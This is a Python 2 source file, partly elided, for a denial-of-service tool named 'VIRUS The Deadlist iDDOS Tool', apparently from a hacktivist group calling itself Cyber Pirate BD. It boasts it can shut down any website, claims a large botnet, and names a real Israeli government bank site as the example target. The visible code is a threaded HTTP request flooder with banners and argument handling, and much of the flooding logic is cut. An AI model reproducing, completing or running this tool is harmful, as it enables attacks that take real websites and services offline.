# ----------------------------------------------------------------------------------------------
# VIRUS The Deadlist iDDOS Tool
#
#VIRUS it's one of the Most Powerful iDDOS Tool
# This tool can Shut down any websites
# 
#
# author : Unknown Bot , version 1.0
# ----------------------------------------------------------------------------------------------
import urllib2
import sys
import threading
...
def usage():
	print 'V1RUS iDDoS Tool'
	print 'CyberPirateBD Facebook: http://m.facebook.com/cyberpiratebd'
	print 'Loaded Botnets: 1,798,498'
	print 'Usage: vrs (url)'
	print 'Example: vrs.py http://israbank.gov.il/'
	print "\a"
print \
"""
print "@@@    @@@ @@@@  @@@@@   @@    @@  @@@@@@"
...
[########TH3 D3AD15T iDD05  T00L########]
[########CYBER PIRATE BANGLADESH########]
[########B3 R3ADY W3 AR3 C0M1NG#########]
[#TH15  DD05 T00L 1S CR3AT3D BY C.P.B.D#]
[######5CR1PT C0D3D BY UNKNOWN BOT######]
...
def httpcall(url):
	...
	try:
			...
			#print e.code
			set_flag(1)
			print "We Are The CYB3R P1RAT3 BD"
			code=500
	...
	def run(self):
		...
		while flag==0:
			if (previous+100<request_counter) & (previous<>request_counter):
				previous=request_counter
		if flag==2:
			print "\n-- Sending massive packets of fear by VIRUS --"
...
if len(sys.argv) < 2:
	...
	if sys.argv[1]=="help":
		...
		print "VIRUS iDDoS Tool "
		print "Created By Cyber Pirate BD"
		if len(sys.argv)== 3:
			if sys.argv[2]=="safe":
				set_safe()
		url = sys.argv[1]
